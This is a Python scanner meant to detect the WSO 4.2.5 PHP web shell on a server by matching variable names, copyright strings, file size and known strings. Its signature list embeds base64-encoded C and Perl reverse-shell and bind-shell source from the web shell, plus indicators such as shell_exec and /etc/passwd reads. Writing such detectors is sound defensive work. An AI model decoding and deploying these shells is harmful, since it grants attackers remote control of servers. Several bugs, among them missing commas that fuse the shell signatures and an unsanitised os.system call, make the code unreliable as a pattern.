#!/usr/bin/python3
import subprocess

ScriptName = "wso_locator.py"
Description = "Script to find WSO 4.2.5 Web-shell of type PHP in a server directory."
__Author__ = "Yonatan Robert Tiger"
__Date__ = "03/08/2021"

from core.colors import *
import os
import sys
import argparse
from time import sleep
from collections import Counter
import hashlib

try:
    os.system('clear')
    import pyfiglet
except:
    pass
ioc_count = {}

variable_names = [
    '▛',
    '▘',
    '▜',
    '▚',
    '▙',
    'back_connect_c',
    'bind_port_c',
    'bind_port_p',
    'bind_port_p',
]

# Range of file size that might could be the Web-shell
min_size = 79000
max_size = 80000

copyrights = [
    '/* (С) 11.2011 oRb */',
    '/* (С) 08.2015 dmkcv */',
    '/* (С) 12.2015 mitryz */',
    "'VERSION', '4.2.5'",
]

strings = [
    'I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pIHsNCiAgICBpbnQgZmQ7DQogICAgc3RydWN0IHNvY2thZGRyX2luIHNpbjsNCiAgICBkYWVtb24oMSwwKTsNCiAgICBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJdKSk7DQogICAgc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsNCiAgICBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsNCiAgICBpZiAoKGNvbm5lY3QoZmQsIChzdHJ1Y3Qgc29ja2FkZHIgKikgJnNpbiwgc2l6ZW9mKHN0cnVjdCBzb2NrYWRkcikpKTwwKSB7DQogICAgICAgIHBlcnJvcigiQ29ubmVjdCBmYWlsIik7DQogICAgICAgIHJldHVybiAwOw0KICAgIH0NCiAgICBkdXAyKGZkLCAwKTsNCiAgICBkdXAyKGZkLCAxKTsNCiAgICBkdXAyKGZkLCAyKTsNCiAgICBzeXN0ZW0oIi9iaW4vc2ggLWkiKTsNCiAgICBjbG9zZShmZCk7DQp9'
    'IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7'
    'I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8bmV0ZGIuaD4NCiNpbmNsdWRlIDxzdGRsaWIuaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICoqYXJndikgew0KICAgIGludCBzLGMsaTsNCiAgICBjaGFyIHBbMzBdOw0KICAgIHN0cnVjdCBzb2NrYWRkcl9pbiByOw0KICAgIGRhZW1vbigxLDApOw0KICAgIHMgPSBzb2NrZXQoQUZfSU5FVCxTT0NLX1NUUkVBTSwwKTsNCiAgICBpZighcykgcmV0dXJuIC0xOw0KICAgIHIuc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgci5zaW5fcG9ydCA9IGh0b25zKGF0b2koYXJndlsxXSkpOw0KICAgIHIuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7DQogICAgYmluZChzLCAoc3RydWN0IHNvY2thZGRyICopJnIsIDB4MTApOw0KICAgIGxpc3RlbihzLCA1KTsNCiAgICB3aGlsZSgxKSB7DQogICAgICAgIGM9YWNjZXB0KHMsMCwwKTsNCiAgICAgICAgZHVwMihjLDApOw0KICAgICAgICBkdXAyKGMsMSk7DQogICAgICAgIGR1cDIoYywyKTsNCiAgICAgICAgd3JpdGUoYywiUGFzc3dvcmQ6Iiw5KTsNCiAgICAgICAgcmVhZChjLHAsc2l6ZW9mKHApKTsNCiAgICAgICAgZm9yKGk9MDtpPHN0cmxlbihwKTtpKyspDQogICAgICAgICAgICBpZiggKHBbaV0gPT0gJ1xuJykgfHwgKHBbaV0gPT0gJ1xyJykgKQ0KICAgICAgICAgICAgICAgIHBbaV0gPSAnXDAnOw0KICAgICAgICBpZiAoc3RyY21wKGFyZ3ZbMl0scCkgPT0gMCkNCiAgICAgICAgICAgIHN5c3RlbSgiL2Jpbi9zaCAtaSIpOw0KICAgICAgICBjbG9zZShjKTsNCiAgICB9DQp9'
    'IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0='
    '21232f297a57a5a743894a0e4a801fc3',  # admin
    'decrypt',
    'base64_encode',
    'base64_decode',
    'ob_start',
    'ob_get_clean',
    'shell_exec',
    '↳ Query did not return anything\n',
    'Readable /etc/passwd',
    'FilesMan',
]

def md5(fname: str) -> str:
    """
    Returns the MD5 checksum of the file given.
    :param fname: File full path.
    :return: MD5 checksum of file.
    """
    hash_md5 = hashlib.md5()
    with open(fname, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_md5.update(chunk)
    return hash_md5.hexdigest()


def walk_directory(dir: str) -> list:
    """
    Crawls the given directory and returns a list of PHP files to check for the different tests.
    :param dir: The starting directory to start crawling.
    :return: List of all files with full paths from the starting directory.
    """
    print(f"\n{bold}{run}{bold} Fetching all PHP files in {dir} and it's sub-directories{end}...")
    files_list = []
    for root, dirs, files in os.walk(dir):
        for file in files:
            if file.lower().endswith('.php'): files_list.append(root + "/" + file)
    return files_list


def read_data(file: str) -> str:
    """
    Tries to reads data as ASCII from the file given.
    :param file: File to read data from.
    :return: If read was possible, returns data to the calling function (data is in str format)
    """
    data = ''
    try:
        data = open(file, "r").read()
        ioc_count[file] = 0
    except UnicodeDecodeError as uni_d_error:
        if verbose:
            print(f"{bad} Couldn't read file: {bold}{file}{end} due to decode error:\n\t {uni_d_error}")
            pass
    return data


def match_variable_names(files: list):
    """
    Finds variables names in the files that are in WSO 4.2.5 Web-shell and counts their occurrences.
    :param files: List of all files with full paths from the starting directory.
    """
    print(f"\n{bold}{run}{bold} Starting variable names matching test{end}...")
    for file in files:
        results = {}
        data = read_data(file)
        for var in variable_names:
            if var in data:
                ioc_count[file] += 1
                results[var] = 0
                count = data.count(var)
                print(f"\t{info} Found matching anomaly variable name: {bold}{var}{end} in: {bold}{file}{end}.")
                results[var] = count
        if results and verbose:
            print(f"\n\t{bold}{good}{bold} Results for {underline}{file}{end}:")
            for key in results:
                print(f"  \tVariable: '{key}': {underline}{results[key]}{end} times")


def match_file_size(files: list, min: int, max: int):
    """
    Finds files with about the same size as the Web-shell.
    :param files: List of all files with full paths from the starting directory.
    :param min: Minimum file size that this function will alert of.
    :param max: Maximum file size that this function will alert of.
    """
    print(f"\n{bold}{run}{bold} Starting size comparison matching{end}...")
    if verbose:
        print(f"{underline}Sizes set to{end}: {min}-{max}")
    for file in files:
        isInRange = False
        size = os.stat(file).st_size  # Current file size
        if size in range(min, max):
            ioc_count[file] += 1
            print(f"\t{info} Found file with relative same size: {bold}{file}{end}: {bold}{size} Bytes{end}.")
            isInRange = True
        if isInRange and verbose:
            print(f"\n\t{bold}{good}{bold} Results for {underline}{file}{end}:")
            print(f"\tSize: {underline}{size}{end} bytes")


def match_copyrights(files: list) -> dict:
    """
    Checks if at least 1 of the copyright signatures are present in a file.
    :param files: List of all files with full paths from the starting directory.
    """
    print(f"\n{bold}{run}{bold} Starting copyrights claims matching test{end}...")
    for file in files:
        results = {}
        data = read_data(file)
        for claim in copyrights:
            if claim in data:
                ioc_count[file] += 1
                results[claim] = True
                print(f"\t{info} Found copyright claim: {bold}{claim}{end} in file: {bold}{file}{end}")
        if results and verbose:
            print(f"\n\t{bold}{good}{bold} Results for {underline}{file}{end}:")
            for key in results:
                print(f"\tCopyright Claim: {bold}{key}{end}")


def match_strings(files: list):
    """
    Iterates through the files and looks for specific strings that are found in WSO 4.2.5 Web-shell.
    :param files: List of all files with full paths from the starting directory.
    """
    print(f"\n{bold}{run}{bold} Starting strings matching test{end}...")
    if verbose: print(f"\t{info} Results needs to be double-checked for false positives.")
    for file in files:
        results = {}
        data = read_data(file)
        for string in strings:
            if string in data:
                count = data.count(string)
                ioc_count[file] += count
                print(f"\t{info} Found string: {underline}{string}{end} {bold}{count}{end} times in {bold}{file}{end}.")
                results[string] = count
        if results and verbose:
            print(f"\n\t{bold}{good}{bold} Results for {underline}{file}{end}:")
            for key in results:
                print(f"\tString: {bold}'{key}': present {underline}{results[key]}{end} times.")
            print("")

def final(ioc_count: dict, top_files: int):
    """
    Prints final results to stdout: Prints the highest risk file with MD5 checksum as well as the top files that might be worth further insepction, based on IoCs count
    :param ioc_count: Dictionary of file names and their IoC count.
    :param top_files: Int for presenting the other top files with highest IoC count.
    """
    print("\n====================")
    if not verbose:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(ascii_banner)
    print(f"{info} Results based on the highest number of IoCs found in each file.")
    print(f"\t{info} {underline}{bold}Highest number of IoC found in{end}:")
    max_key = max(ioc_count, key=ioc_count.get)
    print(f"\t - {underline}Full Path{end}: {max_key}")
    file_md5 = md5(max_key)
    print(f"\t - {underline}MD5{end}: {file_md5}")
    print("====================")
    print(f"{info} Top {top_files} files found:")
    c = Counter(ioc_count)
    most_common = c.most_common(top_files)
    for tup in most_common:
        (filename, num_ioc) = tup
        print(f"\t - {underline}Full Path{end}: {filename}")
        print(f"\t - {underline}Number of IoCs{end}: {num_ioc}")
        file_md5 = md5(max_key)
        print(f"\t - {underline}MD5{end}: {file_md5}")
        print("")

    print(f"{good} {bold}File {max_key} is probably a WSO Webshell!{end}")
    print("\tWould you like to open it in an editor?")
    ans = ''
    while ans != 'y' or ans != 'n':
        ans = input("Please enter 'y' or 'n': ")
        if 'y' in ans:
            print("\tWhat editor to use (Please provide the bin executable that is configured in your PATH and any arguments if you want) Examples:")
            print("\tVisualStudio Code = 'code'")
            print("\tMousepad = 'mousepad'")
            print("\tNano = 'nano'")
            editor = input(": ")
            os.system(f"{editor} {max_key}")
            exit(1)
        if 'n' in ans: exit(1)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description=ScriptName + ', ' + Description,
                                     epilog=f"Created at: {__Date__}, by: {__Author__}")
    parser.add_argument('Directory', help='Full path of the server directory to scan for the web-shell')
    parser.add_argument('-v', '--Verbose',
                        help='Activates verbose mode',
                        default=False,
                        action='store_true')
    parser.add_argument('--num-top-list', help = 'Number of how many files to show in the results (based on highest IoCs found, Default = 5)', type = int, default = 5, dest = 'top_files')
    args = parser.parse_args()

    # Banner:
    try:
        ascii_banner = pyfiglet.figlet_format(f"{ScriptName}")
        print(ascii_banner)
    except:
        print(f"{ScriptName}")
    print(f"{ScriptName}, {Description}, Created at: {__Date__}, by: {__Author__}")
    sleep(3)

    # Variables for arguments:
    dir = args.Directory
    verbose = args.Verbose
    top_files = args.top_files

    files_list = walk_directory(dir)  # Sets the file list to scan through

    # All tests:
    match_variable_names(files_list)
    match_file_size(files_list, min_size, max_size)
    match_copyrights(files_list)
    match_strings(files_list)
    # Final results print & an option to open the highest risk file:
    final(ioc_count, top_files)
